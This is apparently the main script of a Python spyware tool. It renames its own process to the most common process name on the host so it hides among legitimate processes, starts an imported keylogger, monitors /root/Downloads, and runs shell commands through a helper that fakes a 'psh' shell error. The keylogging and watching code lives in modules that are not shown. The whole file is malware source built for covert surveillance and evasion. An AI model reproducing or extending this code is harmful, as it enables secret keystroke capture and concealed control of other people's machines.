import subprocess
import setproctitle
import psutil


from watch import Watch
from keylog import Keylog


def get_best_process_name():
    process_dict = {}
    for proc in psutil.process_iter():
        try:
            process_name = proc.name()
            if process_name in process_dict:
                process_dict.update({process_name: process_dict.get(process_name) + 1})
            else:
                process_dict[process_name] = 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    best_process_name = next(iter(process_dict))
    for process_name in process_dict:
        if process_dict.get(process_name) > process_dict.get(best_process_name):
            best_process_name = process_name
    return best_process_name


def run_command(command):
    try:
        data = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = data.communicate()
    except Exception:
        out = ("psh: command not found: {}".format(command))
    print(out.decode())


if __name__ == '__main__':
    setproctitle.setproctitle(get_best_process_name())
    key_logger = Keylog()
    key_logger.start_keylogger()
    key_logger.stop_keylogger()
    watch = Watch()
    watch.add_watched("/root/Downloads", True)
    watch.start()
    watch.stop()
    run_command("ls")
    run_command("ls -a")
